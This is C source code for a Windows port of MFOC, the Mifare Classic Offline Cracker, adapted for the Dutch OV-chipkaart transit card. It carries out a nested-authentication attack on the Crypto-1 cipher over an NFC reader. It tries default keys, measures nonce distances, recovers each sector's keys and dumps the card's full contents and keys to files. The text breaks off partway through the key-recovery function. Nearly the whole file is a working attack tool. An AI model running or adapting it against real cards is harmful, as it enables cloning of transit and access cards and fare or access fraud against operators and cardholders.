/*  
 
 Mifare Classic Offline Cracker version 0.08
 
 Requirements: crapto1 library http://code.google.com/p/crapto1
 libnfc                        http://www.libnfc.org
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 2 of the License, or
 (at your option) any later version.
 
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 Contact: <mifare@nethemba.com>

 Porting to libnfc 1.3.3: Michal Boska <boska.michal@gmail.com>
 Porting to libnfc 1.3.9: Romuald Conty <romuald@libnfc.org>
 Porting to Windows by THC - University of Twente
 
 URL http://eprint.iacr.org/2009/137.pdf
 URL http://www.sos.cs.ru.nl/applications/rfid/2008-esorics.pdf
 URL http://www.cosic.esat.kuleuven.be/rfidsec09/Papers/mifare_courtois_rfidsec09.pdf
 URL http://www.cs.ru.nl/~petervr/papers/grvw_2009_pickpocket.pdf
*/

#include "stdafx.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <direct.h>

// NFC
#include <nfc/nfc.h>

// Crapto1
#include "crapto1.h"

// Internal
//#include "config.h"
#include "mifare.h"
#include "nfc-utils.h"
#include "OV MFOC Port.h"

#define u_int32_t uint32_t

char end[11];

int main(int argc, char * const argv[]) {
	
	int ch, k, n;
	unsigned int i, j, m, o;
	int key, block;
	int succeed = 1;
	
	// Exploit sector
	int e_sector; 
	int probes = DEFAULT_PROBES_NR;
	int sets = DEFAULT_SETS_NR;
		
	// By default, dump 'A' keys
	bool dumpKeysA = true;
	bool skip = false;
	bool keysFound = false;
	bool skipB = false;
	bool skipOff = false;
	bool useKeyFile = true;

	char fileName[5+1+8+5+1];
	FILE * keyFileA;
	FILE * keyFileB;
	byte_t keyBuffer[40][6];
	
	// Next default key specified as option (-k)
	byte_t * defKey = NULL; 
	
	// Array with default Mifare Classic keys
	byte_t defaultKeys[][6] = {
		{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, // User defined key slot
		//{0x, 0x, 0x, 0x, 0x, 0x},
		{0xb5, 0xff, 0x67, 0xcb, 0xa9, 0x51},
		{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	};
	
	mftag		t;
	mfreader	r;
	denonce		d = {NULL, 0, DEFAULT_DIST_NR, DEFAULT_TOLERANCE, {0x00, 0x00, 0x00}};

	// Pointers to possible keys
	pKeys		*pk;
	countKeys	*ck;
	
	// Pointer to already broken keys, except defaults
	bKeys		*bk;
	
	static mifare_param mp;
 	static mifare_classic_tag mtDump;
	
	mifare_cmd mc;
	FILE *pfDump = NULL;

	// Parse command line arguments
	i=1;
	while(i<argc){
		char *arg = NULL;
		char *param = argv[i];
		if((i+1)<argc){
			arg = argv[i+1];
		}
		unsigned int size = strlen(param);
		
		if(size==2&&(param[0]=='-'||param[0]=='\\')){
			char par = param[1];
			switch(par){
			case 'P':
				if (arg!=NULL&&(!(probes = atoi(arg)) || probes < 1)) {
					fprintf(stderr, "The number of probes must be a positive number\n"); 
					usage(stderr);
				}
				i++;
				break;
			case 'T':
				// Nonce tolerance range
				if (arg!=NULL&&(!(d.tolerance = atoi(arg)) || d.tolerance < 0)) {
					fprintf(stderr, "The nonce distances range must be a zero or a positive number\n"); 
					usage(stderr);
				}
				i++;
				// fprintf(stdout, "Tolerance number: %d\n", probes);
				break;
			case 'k':
				// Add this key to the default keys list
				if ((defKey = (byte_t*)calloc(6, sizeof(byte_t))) == NULL) {
					fprintf(stderr, "Cannot allocate memory for defKey\n");
					usage(stderr);
				} else {
					if(arg!=NULL){
						memset(defKey, 0, 6);
						num_to_bytes(strtol(arg, NULL, 16), 6, defKey);
						memcpy(defaultKeys[0], defKey, 6);
					}else{
						usage(stderr);
					}
				}
				i++;
				fprintf(stdout, "The custom key 0x%012llx has been added to the default keys\n", bytes_to_num(defKey, 6));
				
				break;				
			case 'O':
				// File output
				if (arg!=NULL&&!(pfDump = fopen(arg, "wb"))) {
					fprintf(stderr, "Cannot open: %s, exiting\n", arg); 
					usage(stderr);
				}
				i++;
				break;
			case 'F':
				useKeyFile = false;
				break;
			case 'B':
				skipB = true;
				break;
			case 'S':
				skipOff = true;
				break;
			case 'h':
				usage(stdout);
				break;
			default:
				usage(stderr);
			}
		}else{
			usage(stderr);
		}
		i++;
	}



	
	// Initialize reader/tag structures
	mf_init(&t, &r);
	// Configure reader settings
	mf_configure(r.pdi);
	mf_select_tag(r.pdi, &t.ti);
	
	// Save tag uid and info about block size (b4K)
	t.b4K = (t.ti.nai.abtAtqa[1] == 0x02);
	t.uid = (uint32_t) bytes_to_num(t.ti.nai.abtUid, 4);

	t.num_blocks = (t.b4K) ? 0xff : 0x3f;
	t.num_sectors = t.b4K ? NR_TRAILERS_4k : NR_TRAILERS_1k;
	
	t.sectors = (sector *) calloc(t.num_sectors, sizeof(sector));
	if (t.sectors == NULL) {
		fprintf(stderr, "Cannot allocate memory for t.sectors\n"); 
		gets_s(end,11);
		exit(1);
	}
	if ((pk = (pKeys *) malloc(sizeof(pKeys))) == NULL) {
		fprintf(stderr, "Cannot allocate memory for pk\n"); 
		gets_s(end,11);
		exit(1);
	}
	if ((bk = (bKeys *) malloc(sizeof(bKeys))) == NULL) {
		fprintf(stderr, "Cannot allocate memory for bk\n"); 
		gets_s(end,11);
		exit(1);
	} else { 
		bk->brokenKeys = NULL;
		bk->size = 0; 
	}
		
	d.distances = (uint32_t *) calloc(d.num_distances, sizeof(u_int32_t));
	if (d.distances == NULL) {
		fprintf(stderr, "Cannot allocate memory for t.distances\n"); 
		gets_s(end,11);
		exit(1);
	}		
	
	// Test if a compatible MIFARE tag is used
	if ((t.ti.nai.btSak & 0x08) == 0) {
		printf("Error: inserted tag is not a MIFARE Classic card\n");
		nfc_disconnect(r.pdi);
		gets_s(end,11);
		exit(1);
	}
	
	// Initialize t.sectors, keys are not known yet
	for (i = 0; i < (t.num_sectors); ++i) {
		t.sectors[i].foundKeyA = t.sectors[i].foundKeyB = false;
	}
	
	fprintf(stdout, "Found MIFARE Classic %cK card with uid: %08x\n", (t.b4K ? '4' : '1'), t.uid);

	if(useKeyFile){
		sprintf(fileName, "keys/a%08x.dump", t.uid);
		if (keyFileA = fopen(fileName, "rb")){
			printf("A-key file found.\n");
			if(fread(keyBuffer, 6, 40, keyFileA)==40){
				//keysFound = true;
				int keyPlace;
				for(keyPlace = 0;keyPlace<40;keyPlace++){
					t.sectors[keyPlace].foundKeyA = true;
					memcpy(t.sectors[keyPlace].KeyA, keyBuffer[keyPlace],6);
				}
			}
			fclose(keyFileA);
			sprintf(fileName, "keys/b%08x.dump", t.uid);
			if (keyFileB = fopen(fileName, "rb")){
				printf("B-key file found.\n");
				if(fread(keyBuffer, 6, 40, keyFileB)==40){
					keysFound = true;
					int keyPlace;
					for(keyPlace = 0;keyPlace<40;keyPlace++){
						t.sectors[keyPlace].foundKeyB = true;
						memcpy(t.sectors[keyPlace].KeyB, keyBuffer[keyPlace],6);
					}
				}
				fclose(keyFileB);
			}else{
				if(!skipB){
					printf("Didn't find B-key file. Start cracking keys.\n");
					keysFound = false;
				}
			}
		
		}else{
			printf("Didn't find A-key file. Start cracking keys.\n");
		}
	}
	if(!keysFound){
		// Try to authenticate to all sectors with default keys
		// Set the authentication information (uid)
		memcpy(mp.mpa.abtUid, t.ti.nai.abtUid, sizeof(mp.mpa.abtUid));
		// Iterate over all keys (n = number of keys)
		n = sizeof(defaultKeys)/sizeof(defaultKeys[0]);

		for (key = 0; key < n; key++) {
			if (key == 0 && defKey == NULL) ++key; // Custom key not provided, try another key
			memcpy(mp.mpa.abtKey, defaultKeys[key], sizeof(mp.mpa.abtKey));
			fprintf(stdout, "[Key: %012llx] -> ", bytes_to_num(mp.mpa.abtKey, 6));
			fprintf(stdout, "[");
			i = 0; // Sector counter
			// Iterate over every block, where we haven't found a key yet
			for (block = 0; block <= t.num_blocks; ++block) {
				if (trailer_block(block)) {
					bool found_key = false;
					if (!t.sectors[i].foundKeyA) {
						mc = MC_AUTH_A;
						if (!nfc_initiator_mifare_cmd(r.pdi,mc,block,&mp)) {
							// fprintf(stdout, "!!Error: AUTH [Key A:%012llx] sector %02x t_block %02x\n", 
							// 	bytes_to_num(mp.mpa.abtKey, 6), i, block);
							mf_anticollision(&t, &r);
						} else {
							// Save all information about successfull keyA authentization
							memcpy(t.sectors[i].KeyA, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
							t.sectors[i].foundKeyA = true;
							found_key = true;
						}
					}
					if (!t.sectors[i].foundKeyB&&!skipB) {
						mc = MC_AUTH_B;
					
						if (!nfc_initiator_mifare_cmd(r.pdi,mc,block,&mp)) {
							// fprintf(stdout, "!!Error: AUTH [Key B:%012llx] sector %02x t_block %02x\n", 
							//	bytes_to_num(mp.mpa.abtKey, 6), i, block);
							mf_anticollision(&t, &r);
							// No success, try next block
							t.sectors[i].trailer = block;
						} else {
							memcpy(t.sectors[i].KeyB, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
							t.sectors[i].foundKeyB = true;
							found_key = true;
						}
					}
				
					if ((t.sectors[i].foundKeyA) && (t.sectors[i].foundKeyB)) {
						fprintf(stdout, "x");
					} else if ((t.sectors[i].foundKeyA)) {
						fprintf(stdout, "a");
					} else if ((t.sectors[i].foundKeyB)) {
						fprintf(stdout, "b");
					} else {
						fprintf(stdout, ".");
					}
					fflush(stdout);

					t.sectors[i++].trailer = block;

					if(found_key && key > 1) {
						break;
					}
				}
			}
			fprintf(stdout, "]\n");
		}
		fprintf(stdout, "\n");
		for (i = 0; i < (t.num_sectors); ++i) {
				fprintf(stdout, "Sector %02d - %12s  ", i, ((t.sectors[i].foundKeyA) ? " FOUND_KEY   [A]" : " UNKNOWN_KEY [A]"));
				fprintf(stdout, "Sector %02d - %12s  ", i, ((t.sectors[i].foundKeyB) ? " FOUND_KEY   [B]" : " UNKNOWN_KEY [B]"));
				fprintf(stdout, "\n");
		}
		fflush(stdout);
		mf_configure(r.pdi);
		mf_anticollision(&t, &r);
		// Return the first (exploit) sector encrypted with the default key or -1 (we have all keys)
		e_sector = find_exploit_sector(t);
		//mf_enhanced_auth(e_sector, 0, t, r, &d, pk, 'd'); // AUTH + Get Distances mode
		
		// Recover key from encrypted sectors, j is a sector counter
		for (m = 0; m < (skipB?1:2); ++m) {
			if (e_sector == -1) break; // All keys are default, I am skipping recovery mode
			for (j = 0; j < (t.num_sectors); ++j) {
				memcpy(mp.mpa.abtUid, t.ti.nai.abtUid, sizeof(mp.mpa.abtUid));
				if ((dumpKeysA && !t.sectors[j].foundKeyA) || (!dumpKeysA && !t.sectors[j].foundKeyB)) {
				
					// First, try already broken keys
					skip = false;
					for (o = 0; o < bk->size; o++) {
						num_to_bytes(bk->brokenKeys[o], 6, mp.mpa.abtKey);
						mc = dumpKeysA ? MC_AUTH_A : MC_AUTH_B;
						if (!nfc_initiator_mifare_cmd(r.pdi,mc,t.sectors[j].trailer,&mp)) {
						//	fprintf(stdout, "!!Error: AUTH [Key A:%012llx] sector %02x t_block %02x, key %d\n", 
						//			bytes_to_num(mp.mpa.abtKey, 6), j, t.sectors[j].trailer, o);
							mf_anticollision(&t, &r);
						} else {
							// Save all information about successfull authentization
							if (dumpKeysA) {
								memcpy(t.sectors[j].KeyA, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
								t.sectors[j].foundKeyA = true;
							} else if(!skipB){
								memcpy(t.sectors[j].KeyB, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
								t.sectors[j].foundKeyB = true;
							}

							printf("Sector: %d, type %c\n", j, (dumpKeysA ? 'A' : 'B'));

						

							fprintf(stdout, "Found Key: %c [%012llx]\n", (dumpKeysA ? 'A' : 'B'), 
									bytes_to_num(mp.mpa.abtKey, 6));
							mf_configure(r.pdi);
							mf_anticollision(&t, &r);
							skip = true;
							break;
						}
					}
					if (skip) continue; // We have already revealed key, go to the next iteration
				
					// Max probes for auth for each sector
					for (k = 0; k < probes; ++k) {
						// Try to authenticate to exploit sector and determine distances (filling denonce.distances)
						mf_enhanced_auth(e_sector, 0, t, r, &d, pk, 'd', dumpKeysA); // AUTH + Get Distances mode
						printf("Sector: %d, type %c, probe %d, distance %d ", j, (dumpKeysA ? 'A' : 'B'), k, d.median);
						// Configure device to the previous state 
						mf_configure(r.pdi);
						mf_anticollision(&t, &r);
			
						pk->possibleKeys = NULL;
						pk->size = 0;
						// We have 'sets' * 32b keystream of potential keys
						for (n = 0; n < sets; n++) {
							// AUTH + Recovery key mode (for a_sector), repeat 5 times
							mf_enhanced_auth(e_sector, t.sectors[j].trailer, t, r, &d, pk, 'r', dumpKeysA);
							mf_configure(r.pdi);
							mf_anticollision(&t, &r);
							fprintf(stdout, ".");
							fflush(stdout);
						}
						fprintf(stdout, "\n");
						// Get first 15 grouped keys
						ck = uniqsort(pk->possibleKeys, pk->size);
						for (i = 0; i < TRY_KEYS ; i++) {
							// We don't known this key, try to break it
							// This key can be found here two or more times
							if (ck[i].count > 0) {
								// fprintf(stdout,"%d %llx\n",ck[i].count, ck[i].key);
								// Set required authetication method
								num_to_bytes(ck[i].key, 6, mp.mpa.abtKey); 
								mc = dumpKeysA ? MC_AUTH_A : MC_AUTH_B;
								if (!nfc_initiator_mifare_cmd(r.pdi,mc,t.sectors[j].trailer,&mp)) {
									// fprintf(stdout, "!!Error: AUTH [Key A:%llx] sector %02x t_block %02x\n", 
									// 	bytes_to_num(mp.mpa.abtKey, 6), j, t.sectors[j].trailer);
									mf_anticollision(&t, &r);
								} else {
									// Save all information about successfull authentization
									bk->size++;
									bk->brokenKeys = (uint64_t *) realloc((void *)bk->brokenKeys, bk->size * sizeof(uint64_t));
									bk->brokenKeys[bk->size-1] = bytes_to_num(mp.mpa.abtKey, 6);
									if (dumpKeysA) {
										memcpy(t.sectors[j].KeyA, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
										t.sectors[j].foundKeyA = true;
									} else {
										memcpy(t.sectors[j].KeyB, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
										t.sectors[j].foundKeyB = true;
									}
									fprintf(stdout, "Found Key: %c [%012llx]\n", (dumpKeysA ? 'A' : 'B'), 
											bytes_to_num(mp.mpa.abtKey, 6));
									mf_configure(r.pdi);
									mf_anticollision(&t, &r);
									break;
								}
							}
						}
						free(pk->possibleKeys);
						free(ck);
						// Success, try the next sector
						if ((dumpKeysA && t.sectors[j].foundKeyA) || (!dumpKeysA && t.sectors[j].foundKeyB)) break;									
					}
					// We haven't found any key, exiting
					if ((dumpKeysA && !t.sectors[j].foundKeyA) || (!dumpKeysA && !t.sectors[j].foundKeyB)) { 
						fprintf(stderr, "No success, maybe you should increase the probes\n");
						gets_s(end,11);
						exit(1);
					}
				}
			}
			dumpKeysA = false;
		}
	}
		
		
	for (i = 0; i < (t.num_sectors); ++i) {
		if ((dumpKeysA && !t.sectors[i].foundKeyA) || (!skipB&&(!dumpKeysA && !t.sectors[i].foundKeyB))) {
			fprintf(stdout, "\nTry again, there are still some encrypted blocks\n");
			succeed = 0;
			break;
		}
	}

	if (succeed) {
		if(pfDump==NULL){
			char filename[1000];
			int tim= time(NULL);
			sprintf(filename, "dumpfile %08x (%u).dump", t.uid,tim);
			if (!(pfDump = fopen(filename, "wb"))) {
				fprintf(stderr, "Cannot open: %s, exiting\n", filename);
				gets_s(end,10);
				exit(1);
			}
		}

		i = t.num_sectors; // Sector counter
		fprintf(stdout, "Auth with all sectors succeeded, dumping keys to a file!\n");
		// Read all blocks
		uint8_t sec;
		mifare_sector mfs;
		mfs.sector = 0;
		memcpy(mfs.KeyA, t.sectors[0].KeyA, sizeof(t.sectors[0].KeyA));
		readSector(r.pdi, &mfs, &t.ti,false);
		memcpy(&mtDump.amb[sectorToFirstBlock(mfs.sector)],mfs.Data,numberOfBlocks(mfs.sector)*16);
		memcpy(mtDump.amb[sectorToFirstBlock(0)+numberOfBlocks(0)-1].mbt.abtKeyA, t.sectors[0].KeyA,6);
		memcpy(mtDump.amb[sectorToFirstBlock(0)+numberOfBlocks(0)-1].mbt.abtKeyB, t.sectors[0].KeyB,6);

		memset(mfs.Data, 0, sizeof(mfs.Data));

		for(sec = skipOff?22:1;sec<i;sec++){
			mfs.sector = sec;
			memcpy(mfs.KeyA, t.sectors[sec].KeyA, sizeof(t.sectors[sec].KeyA));
			readSector(r.pdi, &mfs, &t.ti,false);
			memcpy(&mtDump.amb[sectorToFirstBlock(sec)],mfs.Data,numberOfBlocks(mfs.sector)*16);
			memcpy(mtDump.amb[sectorToFirstBlock(sec)+numberOfBlocks(sec)-1].mbt.abtKeyA, t.sectors[sec].KeyA,6);
			memcpy(mtDump.amb[sectorToFirstBlock(sec)+numberOfBlocks(sec)-1].mbt.abtKeyB, t.sectors[sec].KeyB,6);

			memcpy(mp.mpa.abtUid,t.ti.nai.abtUid,4);
		}
		// Finally save all keys + data to file
		if (fwrite(&mtDump, 1, sizeof(mtDump), pfDump) != sizeof(mtDump)) {
			fprintf(stdout, "Error, cannot write dump\n");
			fclose(pfDump);
			gets_s(end,11);
			exit(1);
		}
		fclose(pfDump);

		if(useKeyFile){
			mkdir("keys");
			if(!keysFound){
				int keyPlace;
				sprintf(fileName, "keys/a%08x.dump", t.uid);
				if(keyFileA = fopen(fileName, "wb")){
					for(keyPlace = 0;keyPlace<40;keyPlace++){
						memcpy(keyBuffer[keyPlace], t.sectors[keyPlace].KeyA,6);
					}
					fwrite(keyBuffer, 6, 40,keyFileA);
					fclose(keyFileA);
				}else{
					printf("Error: Failed opening A-key file (%s) for writing", fileName);
				}
				if(!skipB){
					sprintf(fileName, "keys/b%08x.dump", t.uid);
					if(keyFileB = fopen(fileName, "wb")){
						for(keyPlace = 0;keyPlace<40;keyPlace++){
							memcpy(keyBuffer[keyPlace], t.sectors[keyPlace].KeyB, 6);
						}
						fwrite(keyBuffer, 6, 40,keyFileB);
						fclose(keyFileB);
					}else{
						printf("Error: Failed opening B-key (%s) file for writing", fileName);
					}
				}
			}
		}
	}
	free(t.sectors);
	free(d.distances);
	
	// Reset the "advanced" configuration to normal
	nfc_configure(r.pdi, NDO_HANDLE_CRC, true);
	nfc_configure(r.pdi, NDO_HANDLE_PARITY, true);

	// Disconnect device and exit
	nfc_disconnect(r.pdi);
	printf("Finished!");
	gets_s(end,11);
    return 0;
}

void reset(mftag *t, mfreader *r){
	printf("Reconnecting to reader.\n");
	nfc_configure(r->pdi, NDO_HANDLE_CRC, true);
	nfc_configure(r->pdi, NDO_HANDLE_PARITY, true);
	nfc_disconnect(r->pdi);
	mf_init(t,r);
	mf_configure(r->pdi);
	mf_select_tag(r->pdi, &t->ti);
}

void usage(FILE * stream) {
	fprintf(stream, "mfoc %s\n\n", "0.09-Windows-OV-chipkaart-port");
	fprintf(stream, "usage: mfoc [-h] [-P probnum] [-T tolerance] [-k custom_key] [-O output] [-F] [-B] [-S]\n\n");
	fprintf(stream, "example: mfoc -O card_dump\n");
	fprintf(stream, "example: mfoc -k ffffeeeedddd -O card_dump\n");
	fprintf(stream, "example: mfoc -P 50 -O card_dump\n");
	fprintf(stream, "\n");					
	fprintf(stream, "  h : print this help\n");
	fprintf(stream, "  k : use a specified key instead of looking for defaults ones\n");
	fprintf(stream, "  P : number of probes for a key recovery for one sector, default is 20\n");
	fprintf(stream, "  T : range for a possible distance tolerance, default is %d (%d in both direction)\n", DEFAULT_TOLERANCE, (DEFAULT_TOLERANCE*2));
	fprintf(stream, "  O : dump file where the revealed keys should be stored (defaults to \"dumpfile <kartId> (<timestamp>).dump\" \n");
	fprintf(stream, "  F : Don't use or save key files.\n");
	fprintf(stream, "  B : Ignore the B-key.\n");
	fprintf(stream, "  S : Skip sector 1-21\n");
	fprintf(stream, "\n");
	exit(1);
}

void mf_init(mftag *t, mfreader *r) {
	// Connect to the first NFC device
	r->pdi = nfc_connect(NULL);
	if (!r->pdi) {
		fprintf(stderr, "!Error connecting to the NFC reader\n");
		gets_s(end,11);
		exit(1);
	}
}

void mf_configure(nfc_device_t* pdi) {
	nfc_initiator_init(pdi);
	// Drop the field for a while, so can be reset
	nfc_configure(pdi,NDO_ACTIVATE_FIELD,false);
	// Let the reader only try once to find a tag
	nfc_configure(pdi,NDO_INFINITE_SELECT,false);
	// Configure the CRC and Parity settings
	nfc_configure(pdi,NDO_HANDLE_CRC,true);
	nfc_configure(pdi,NDO_HANDLE_PARITY,true);
	// Enable the field so more power consuming cards can power themselves up
	nfc_configure(pdi,NDO_ACTIVATE_FIELD,true);
}

void mf_select_tag(nfc_device_t* pdi, nfc_target_info_t* ti) {
	// Poll for a ISO14443A (MIFARE) tag
	if (!nfc_initiator_select_passive_target(pdi,NM_ISO14443A_106,NULL,0,ti)) {
		fprintf(stderr, "!Error connecting to the MIFARE Classic tag\n");
		nfc_disconnect(pdi);
		gets_s(end,11);
		exit(1);
	}
}

int trailer_block(uint32_t block)
{
	// Test if we are in the small or big sectors
	return (block < 128) ? ((block + 1) % 4 == 0) : ((block + 1) % 16 == 0); 
}

// Return position of sector if it is encrypted with the default key otherwise exit..
int find_exploit_sector(mftag t) {
	unsigned int i; 
	bool interesting = false;
	
	for (i = 0; i < t.num_sectors; i++) {
		if (!t.sectors[i].foundKeyA || !t.sectors[i].foundKeyB) {
			interesting = true;
			break;
		}
	}
	if (!interesting) {
		fprintf(stdout, "\nWe have all sectors encrypted with the default keys..\n\n");
		return -1;
	}
	for (i = 0; i < t.num_sectors; i++) {
		if ((t.sectors[i].foundKeyA) || (t.sectors[i].foundKeyB)) {
			fprintf(stdout, "\n\nUsing sector %02d as an exploit sector\n", i);
			return i;
		}
	}
	fprintf(stderr, "\n\nNo sector encrypted with the default key has been found, exiting..\n");
	gets_s(end,11);
	exit(1);
}

void mf_anticollision(mftag *t, mfreader *r) {
	if (!nfc_initiator_select_passive_target(r->pdi, NM_ISO14443A_106, NULL, 0, &t->ti)) {
		reset(t, r);
	}
}

int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d, pKeys *pk, char mode, bool dumpKeysA) {
	struct Crypto1State* pcs;
	struct Crypto1State* revstate;
	struct Crypto1State* revstate_start;

	uint64_t lfsr;
	
	// Possible key counter, just continue with a previous "session"
	uint32_t kcount = pk->size;
		
	byte_t Nr[4] = { 0x00,0x00,0x00,0x00 }; // Reader nonce
	byte_t Auth[4] = { 0x00, t.sectors[e_sector].trailer, 0x00, 0x00 };
	byte_t AuthEnc[4] = { 0x00, t.sectors[e_sector].trailer, 0x00, 0x00 };
	byte_t AuthEncPar[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	
	byte_t ArEnc[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	byte_t ArEncPar[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	
	byte_t Rx[MAX_FRAME_LEN]; // Tag response
	byte_t RxPar[MAX_FRAME_LEN]; // Tag response
	size_t RxLen;
	
	u_int32_t Nt, NtLast, NtProbe, NtEnc, Ks1;

	int i, m;
	
	// Prepare AUTH command
	Auth[0] = (t.sectors[e_sector].foundKeyA) ? 0x60 : 0x61;
	append_iso14443a_crc(Auth,2);
	// fprintf(stdout, "\nAuth command:\t");
	// print_hex(Auth, 4);
	
	// We need full control over the CRC
	if (!nfc_configure(r.pdi, NDO_HANDLE_CRC, false))  {
		nfc_perror (r.pdi, "nfc_configure");
		exit (EXIT_FAILURE);
	}

	// Request plain tag-nonce
	// fprintf(stdout, "\t[Nt]:\t");
	if (!nfc_configure (r.pdi, NDO_EASY_FRAMING, false)) {
		nfc_perror (r.pdi, "nfc_configure");
		exit (EXIT_FAILURE);
	}

	if (!nfc_initiator_transceive_bytes(r.pdi, Auth, 4, Rx, &RxLen)) {
		fprintf(stdout, "Error while requesting plain tag-nonce\n");
		gets_s(end,11);
		exit(EXIT_FAILURE);
	}

	if (!nfc_configure (r.pdi, NDO_EASY_FRAMING, true)) {
		nfc_perror (r.pdi, "nfc_configure");
		gets_s(end,11);
		exit (EXIT_FAILURE);
	}
	// print_hex(Rx, 4);
	
	// Save the tag nonce (Nt)
	Nt = bytes_to_num(Rx, 4);
	
	// Init the cipher with key {0..47} bits
	if (t.sectors[e_sector].foundKeyA) {
		pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyA, 6));
	} else {
		pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyB, 6));
	}

	// Load (plain) uid^nt into the cipher {48..79} bits
	crypto1_word(pcs, bytes_to_num(Rx, 4) ^ t.uid, 0);
	
	// Generate (encrypted) nr+parity by loading it into the cipher
	for (i = 0; i < 4; i++) {
		// Load in, and encrypt the reader nonce (Nr)
		ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
		ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
	}
	// Skip 32 bits in the pseudo random generator
	Nt = prng_successor(Nt, 32);
	// Generate reader-answer from tag-nonce
	for (i = 4; i < 8; i++) {
		// Get the next random byte
		Nt = prng_successor(Nt, 8);
		// Encrypt the reader-answer (Nt' = suc2(Nt))
		ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ (Nt&0xff);
		ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
	}
	
	// Finally we want to send arbitrary parity bits
	nfc_configure(r.pdi, NDO_HANDLE_PARITY, false);
	
	// Transmit reader-answer
	// fprintf(stdout, "\t{Ar}:\t");
	// print_hex_par(ArEnc, 64, ArEncPar);
	if ((!nfc_initiator_transceive_bits(r.pdi, ArEnc, 64, ArEncPar, Rx, &RxLen, RxPar)) || (RxLen != 32)) {
		fprintf(stderr, "Reader-answer transfer error, exiting..\n");
		gets_s(end,11);
		exit(1);
	}
	
	// Now print the answer from the tag
	// fprintf(stdout, "\t{At}:\t");
	// print_hex_par(Rx,RxLen,RxPar);
	
	// Decrypt the tag answer and verify that suc3(Nt) is At
	Nt = prng_successor(Nt, 32);
	if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt&0xFFFFFFFF))) {
		fprintf(stderr, "[At] is not Suc3(Nt), something is wrong, exiting..\n");
		gets_s(end,11);
		exit(1);
	}
	// fprintf(stdout, "Authentication completed.\n\n");
	
	// If we are in "Get Distances" mode
	if (mode == 'd') {
		for (m = 0; m < d->num_distances; m++) {
			// fprintf(stdout, "Nested Auth number: %x: ,", m);
			// Encrypt Auth command with the current keystream
			for (i = 0; i < 4; i++) {
		                AuthEnc[i] = crypto1_byte(pcs,0x00,0) ^ Auth[i];
                		// Encrypt the parity bits with the 4 plaintext bytes
                		AuthEncPar[i] = filter(pcs->odd) ^ oddparity(Auth[i]);
			}

			// Sending the encrypted Auth command
			if (!nfc_initiator_transceive_bits(r.pdi, AuthEnc, 32, AuthEncPar,Rx, &RxLen, RxPar)) {
				fprintf(stdout, "Error requesting encrypted tag-nonce\n");
				gets_s(end,11);
				exit(1);
			}

			// Decrypt the encrypted auth 
			if (t.sectors[e_sector].foundKeyA) {
				pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyA, 6));
			} else {
				pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyB, 6));
			}
			NtLast = bytes_to_num(Rx, 4) ^ crypto1_word(pcs, bytes_to_num(Rx, 4) ^ t.uid, 1); 
			
			// Save the determined nonces distance
			d->distances[m] = nonce_distance(Nt, NtLast);
			// fprintf(stdout, "distance: %05d\n", d->distances[m]);
			
			// Again, prepare and send {At}
			for (i = 0; i < 4; i++) {
				ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
				ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
			}
			Nt = prng_successor(NtLast, 32);
			for (i = 4; i < 8; i++) {
				Nt = prng_successor(Nt, 8);
				ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ (Nt&0xFF);
				ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
			}
			nfc_configure(r.pdi,NDO_HANDLE_PARITY,false);
			if ((!nfc_initiator_transceive_bits(r.pdi, ArEnc, 64, ArEncPar, Rx, &RxLen, RxPar)) || (RxLen != 32)) {
				fprintf(stderr, "Reader-answer transfer error, exiting..\n");
				gets_s(end,11);
				exit(1);
			}
			Nt = prng_successor(Nt, 32);
			if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt&0xFFFFFFFF))) {
				fprintf(stderr, "[At] is not Suc3(Nt), something is wrong, exiting..\n");
				gets_s(end,11);
				exit(1);
			}
		} // Next auth probe
		
		// Find median from all distances
		d->median = median(*d);
		//fprintf(stdout, "Median: %05d\n", d->median);
	} // The end of Get Distances mode
	
	// If we are in "Get Recovery" mode
	if (mode == 'r') {
		// Again, prepare the Auth command with MC_AUTH_A, recover the block and CRC
		Auth[0] = dumpKeysA ? 0x60 : 0x61;
		Auth[1] = a_sector; 
		append_iso14443a_crc(Auth,2);
		
		// Encryption of the Auth command, sending the Auth command
		for (i = 0; i < 4; i++) {
			AuthEnc[i] = crypto1_byte(pcs,0x00,0) ^ Auth[i];
			// Encrypt the parity bits with the 4 plaintext bytes
			AuthEncPar[i] = filter(pcs->odd) ^ oddparity(Auth[i]);
		}
		if (!nfc_initiator_transceive_bits(r.pdi, AuthEnc, 32, AuthEncPar,Rx, &RxLen, RxPar)) {
			fprintf(stdout, "Error requesting encrypted tag-nonce\n");
			gets_s(end,11);
			exit(1);
		}

		// Save the encrypted nonce
		NtEnc = bytes_to_num(Rx, 4);
		
